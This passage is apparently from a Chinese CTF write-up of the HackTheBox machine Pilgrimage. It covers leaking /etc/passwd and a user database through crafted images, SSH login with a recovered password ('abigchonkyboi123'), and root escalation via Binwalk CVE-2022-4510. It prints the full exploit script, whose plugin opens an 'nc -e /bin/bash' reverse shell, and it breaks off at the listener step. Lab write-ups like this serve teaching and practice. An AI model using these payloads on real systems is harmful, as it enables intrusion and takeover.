<li><p>然后我们就可以分析返回的图片了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ identify -verbose output.png<br>Image: output.png<br>  Format: PNG (Portable Network Graphics)<br>  Geometry: 100x100<br>  Class: PseudoClass<br>  Type: palette<br>  Depth: 1 bits-per-pixel component<br>  Channel Depths:<br>    Red:      1 bits<br>    Green:    1 bits<br>    Blue:     1 bits<br>  Channel Statistics:<br>    Red:<br>      Minimum:                 65535.00 (1.0000)<br>      Maximum:                 65535.00 (1.0000)<br>      Mean:                    65535.00 (1.0000)<br>      Standard Deviation:          0.00 (0.0000)<br>    Green:<br>      Minimum:                     0.00 (0.0000)<br>      Maximum:                     0.00 (0.0000)<br>      Mean:                        0.00 (0.0000)<br>      Standard Deviation:          0.00 (0.0000)<br>    Blue:<br>      Minimum:                     0.00 (0.0000)<br>      Maximum:                     0.00 (0.0000)<br>      Mean:                        0.00 (0.0000)<br>      Standard Deviation:          0.00 (0.0000)<br>  Colors: 2<br>    0: (255,  0,  0)      red<br>    1: (255,255,255)      white<br>  Gamma: 0.45455<br>  Chromaticity:<br>    red primary: (0.64,0.33)<br>    green primary: (0.3,0.6)<br>    blue primary: (0.15,0.06)<br>    white point: (0.3127,0.329)<br>  Filesize: 1.1Ki<br>  Interlace: No<br>  Orientation: Unknown<br>  Background Color: #FEFEFE<br>  Border Color: #DFDFDF<br>  Matte Color: #BDBDBD<br>  Page geometry: 100x100+0+0<br>  Compose: Over<br>  Dispose: Undefined<br>  Iterations: 0<br>  Compression: Zip<br>  Png:IHDR.color-type-orig: 3<br>  Png:IHDR.bit-depth-orig: 1<br>  Raw profile type: <br><br>    1437<br>726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d<br>6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f<br>6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e<br>2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269<br>6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f<br>62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d<br>65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a<br>2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a<br>783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f<br>6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372<br>2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73<br>706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31<br>303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f<br>6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573<br>722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d<br>646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b<br>75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f<br>7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69<br>7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67<br>696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73<br>62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d<br>5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e<br>6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334<br>3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e<br>2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374<br>656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72<br>6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65<br>6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e<br>0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052<br>65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f<br>6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973<br>74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573<br>796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69<br>7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c<br>6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d<br>652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78<br>3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f<br>7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f<br>737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938<br>3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a<br><br>  Date:create: 2023-07-11T12:39:40+00:00<br>  Date:modify: 2023-07-11T12:39:40+00:00<br>  Date:timestamp: 2023-07-11T12:39:40+00:00<br>  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6<br>  Tainted: False<br>  Elapsed Time: 0m:0.001572s<br>  Pixels Per Second: 6.1Mi<br></code></pre></td></tr></table></figure>
</li>
<li><p>按照说明将其中的16进制数转换成字符看看结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ python3 -c <span class="hljs-string">&#x27;print(bytes.fromhex(&quot;那一串hex数据&quot;))&#x27;</span><br>b<span class="hljs-string">&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n&#x27;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>成功利用!</p>
</li>
</ol>
<p>通过读取&#x2F;etc&#x2F;passwd我们不仅验证了漏洞的存在，还发现了系统中的一个用户<code>emily</code>。那接下来就是想办法搞到<code>emily</code>的密码。</p>
<p>当然首先想试试能不能直接读取shadow文件偷鸡，发现并不行。那只能寄希望于之前发现的数据库中能给我们点有用的信息了。</p>
<h4 id="读数据库"><a href="#读数据库" class="headerlink" title="读数据库"></a>读数据库</h4><p>步骤同上，就是把第二步改成<code>cargo run &quot;/var/db/pilgrimage&quot;</code>，再重复上面的步骤。当然第5步还是要改一改的。因为sqlite识别数据库文件需要是二进制的，所以我们给他转成二进制。这可以直接用linux自带的<code>xxd</code>实现（<code>xxd -r -ps</code> ）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage] <span class="hljs-comment">#返回的数据太长了，存在文件里方便处理</span><br>└─$ identify -verbose sql.png &gt; sql<br>                                                         <br>┌──(kali㉿kali)-[~/HTB/Pilgrimage] <span class="hljs-comment">#删掉除了16进制数据以外的其他东西</span><br>└─$ vim sql<br><br>┌──(kali㉿kali)-[~/HTB/Pilgrimage] <span class="hljs-comment">#把数据转成二进制 r是hex转bin，ps表示以纯16进制转储</span><br>└─$ xxd -r -ps sql sql.db<br></code></pre></td></tr></table></figure>

<p>数据处理完了，我们把它丢进sqlite3查看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ sqlite3 sql.db<br>SQLite version 3.40.1 2022-12-28 14:03:47<br>Enter <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> usage hints.<br>sqlite&gt; .databases<br>main: /home/kali/HTB/Pilgrimage/sql.db r/w<br>sqlite&gt; .table<br>images  <span class="hljs-built_in">users</span> <br>sqlite&gt; <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span><br>   ...&gt; ;<br>emily|abigchonkyboi123<br>asd|asd<br>toto|toto<br>sqlite&gt; .<span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>

<p>发现users表中刚好有emily的密码，那我们肯定得试试能不能ssh登录系统。</p>
<h3 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]<br>└─$ ssh emily@10.10.11.219<br>emily@10.10.11.219<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">emily@pilgrimage:~$ </span><br></code></pre></td></tr></table></figure>

<p>成功登录，emily的home目录下就有可以拿到user flag。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="三板斧"><a href="#三板斧" class="headerlink" title="三板斧"></a>三板斧</h3><p>上来先<code>sudo -l</code> ，没权限。找一找SUID文件，没发现。看一看crontab，没东西。得了，啥也没有。</p>
<h3 id="手动浏览"><a href="#手动浏览" class="headerlink" title="手动浏览"></a>手动浏览</h3><p>四处查看，也没有看到什么特别的东西。</p>
<h3 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h3><p>那只能上大招了，把<code>linpeas.sh</code>传上去看看结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">╔══════════╣ Checking sudo tokens<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#reusing-sudo-tokens                                                                                                      </span><br>ptrace protection is disabled (0), so sudo tokens could be abused         <br><br>Current user has other interactive shells running<br>    680 /bin/bash /usr/sbin/malwarescan.sh<br>    748 /bin/bash /usr/sbin/malwarescan.sh<br>   1420 /bin/sh ./linpeas.sh<br></code></pre></td></tr></table></figure>

<p>其他没啥特别的，但是这一段值得我们看一下。首先我们查一下他这里说的sudo tokens有没有什么利用方案。查了一下发现背景是同一用户，不知道密码的情况，另一个终端15分钟内输入过sudo密码，当前终端就可以不用密码执行sudo命令。我们<code>ps aux</code>看了一下，发现<code>malwarescan.sh</code>是root用户运行的，并不能用到这个利用方式。</p>
<p>虽然没能利用，但是毕竟<code>malwarescan.sh</code>是root运行的一个shell脚本，我们去看看他的内容有没有什么可以利用来提权的点。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:/usr/sbin$ <span class="hljs-built_in">cat</span> malwarescan.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br>blacklist=(<span class="hljs-string">&quot;Executable script&quot;</span> <span class="hljs-string">&quot;Microsoft executable&quot;</span>)<br><br>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> FILE; <span class="hljs-keyword">do</span><br>        filename=<span class="hljs-string">&quot;/var/www/pilgrimage.htb/shrunk/<span class="hljs-subst">$(/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#x27;s/^.*CREATE //p&#x27;)</span>&quot;</span><br>        binout=<span class="hljs-string">&quot;<span class="hljs-subst">$(/usr/local/bin/binwalk -e <span class="hljs-string">&quot;<span class="hljs-variable">$filename</span>&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">for</span> banned <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;blacklist[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>                <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$binout</span>&quot;</span> == *<span class="hljs-string">&quot;<span class="hljs-variable">$banned</span>&quot;</span>* ]]; <span class="hljs-keyword">then</span><br>                        /usr/bin/rm <span class="hljs-string">&quot;<span class="hljs-variable">$filename</span>&quot;</span><br>                        <span class="hljs-built_in">break</span><br>                <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>

<p>内容很符合脚本名字，扫描文件，发现黑名单中的类型就删掉。</p>
<p>我们发现脚本中的二进制文件都很严谨的写了绝对路径，想利用PATH偷鸡的想法是走不通了。那这些二进制文件是否会存在漏洞可以供我们利用？一个看看吧，inotifywait主要是用来监控文件的，这里持续监控（-m）<code>/var/www/pilgrimage.htb/shrunk/</code>下文件的创建。查了一下没发现可以用来提权的方法。echo，tail和sed就不用看了。那最好只能看看binwalk有什么说法了，没有的话就要想想别的办法了。</p>
<p>我们先看看binwalk的版本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:/usr/sbin$ /usr/local/bin/binwalk -h<br><br>Binwalk v2.3.2<br>Craig Heffner, ReFirmLabs<br>https://github.com/ReFirmLabs/binwalk<br><br>Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...<br></code></pre></td></tr></table></figure>

<h3 id="binwalk提权"><a href="#binwalk提权" class="headerlink" title="binwalk提权"></a>binwalk提权</h3><p>在exp-db上搜发现这个版本的binwalk确实存在RCE漏洞。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]<br>└─$ searchsploit binwalk 2.3.2<br>----------------------------------------------------------- ---------------------------------<br> Exploit Title                                             |  Path<br>----------------------------------------------------------- ---------------------------------<br>Binwalk v2.3.2 - Remote Command Execution (RCE)            | python/remote/51249.py<br>----------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>

<p>搜了一下漏洞的成因是<code>binwalk解析PFS文件时的防路径穿越代码存在问题</code>，导致攻击者可以构造恶意文件直接进行路径穿越。当使用binwalk的-e选项对该恶意文件进行自动提取时，将触发漏洞，将攻击者构造的恶意文件中内嵌的文件写入提取目录之外的路径。这还可以导致远程代码执行。</p>
<p>将漏洞利用脚本下载下来看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Tools/AutoEnum]<br>└─$ <span class="hljs-built_in">cat</span> 51249.py       <br><span class="hljs-comment"># Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)</span><br><span class="hljs-comment"># Exploit Author: Etienne Lacoche</span><br><span class="hljs-comment"># CVE-ID: CVE-2022-4510</span><br>import os<br>import inspect<br>import argparse<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;################################################&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------------------CVE-2022-4510----------------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;################################################&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------Binwalk Remote Command Execution--------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------Binwalk 2.1.2b through 2.3.2 included-----&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------------------------------------------------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;################################################&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------Exploit by: Etienne Lacoche-----------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------Contact Twitter: @electr0sm0g----------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------------------Discovered by:----------------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------Q. Kaiser, ONEKEY Research Lab---------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------Exploit tested on debian 11------------&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;################################################&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Path to input .png file&quot;</span>,default=1)<br>parser.add_argument(<span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Ip to nc listener&quot;</span>,default=1)<br>parser.add_argument(<span class="hljs-string">&quot;port&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Port to nc listener&quot;</span>,default=1)<br><br>args = parser.parse_args()<br><br><span class="hljs-keyword">if</span> args.file and args.ip and args.port:<br>    header_pfs = bytes.fromhex(<span class="hljs-string">&quot;5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e&quot;</span>)<br>    lines = [<span class="hljs-string">&#x27;import binwalk.core.plugin\n&#x27;</span>,<span class="hljs-string">&#x27;import os\n&#x27;</span>, <span class="hljs-string">&#x27;import shutil\n&#x27;</span>,<span class="hljs-string">&#x27;class MaliciousExtractor(binwalk.core.plugin.Plugin):\n&#x27;</span>,<span class="hljs-string">&#x27;    def init(self):\n&#x27;</span>,<span class="hljs-string">&#x27;        if not os.path.exists(&quot;/tmp/.binwalk&quot;):\n&#x27;</span>,<span class="hljs-string">&#x27;            os.system(&quot;nc &#x27;</span>,str(args.ip)+<span class="hljs-string">&#x27; &#x27;</span>,str(args.port)+<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;-e /bin/bash 2&gt;/dev/null &amp;&quot;)\n&#x27;</span>,<span class="hljs-string">&#x27;            with open(&quot;/tmp/.binwalk&quot;, &quot;w&quot;) as f:\n&#x27;</span>,<span class="hljs-string">&#x27;                f.write(&quot;1&quot;)\n&#x27;</span>,<span class="hljs-string">&#x27;        else:\n&#x27;</span>,<span class="hljs-string">&#x27;            os.remove(&quot;/tmp/.binwalk&quot;)\n&#x27;</span>, <span class="hljs-string">&#x27;            os.remove(os.path.abspath(__file__))\n&#x27;</span>,<span class="hljs-string">&#x27;            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), &quot;__pycache__&quot;))\n&#x27;</span>]<br><br>    in_file = open(args.file, <span class="hljs-string">&quot;rb&quot;</span>)<br>    data = in_file.read()<br>    in_file.close()<br><br>    with open(<span class="hljs-string">&quot;/tmp/plugin&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) as f:<br>       <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>          f.write(line)<br><br>    with open(<span class="hljs-string">&quot;/tmp/plugin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) as f:<br>        content = f.read()<br><br>    os.system(<span class="hljs-string">&quot;rm /tmp/plugin&quot;</span>)<br><br>    with open(<span class="hljs-string">&quot;binwalk_exploit.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>        f.write(data)<br>        f.write(header_pfs)<br>        f.write(content)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You can now rename and share binwalk_exploit and start your local netcat listener.&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>) <br></code></pre></td></tr></table></figure>

<p>我们执行一下，在图片中嵌入漏洞利用的PFS。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ python3 51249.py lena.png 10.10.14.64 443<br><br><span class="hljs-comment">################################################</span><br>------------------CVE-2022-4510----------------<br><span class="hljs-comment">################################################</span><br>--------Binwalk Remote Command Execution--------<br>------Binwalk 2.1.2b through 2.3.2 included-----<br>------------------------------------------------<br><span class="hljs-comment">################################################</span><br>----------Exploit by: Etienne Lacoche-----------<br>---------Contact Twitter: @electr0sm0g----------<br>------------------Discovered by:----------------<br>---------Q. Kaiser, ONEKEY Research Lab---------<br>---------Exploit tested on debian 11------------<br><span class="hljs-comment">################################################</span><br><br><br>You can now rename and share binwalk_exploit and start your <span class="hljs-built_in">local</span> netcat listener.<br></code></pre></td></tr></table></figure>

<p>然后我们把文件传上去，直接传到<code>/var/www/pilgrimage.htb/shrunk/</code>可能脚本不会执行，不过我们复制过去的话就可以触发。</p>
<p>本地开个nc监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs 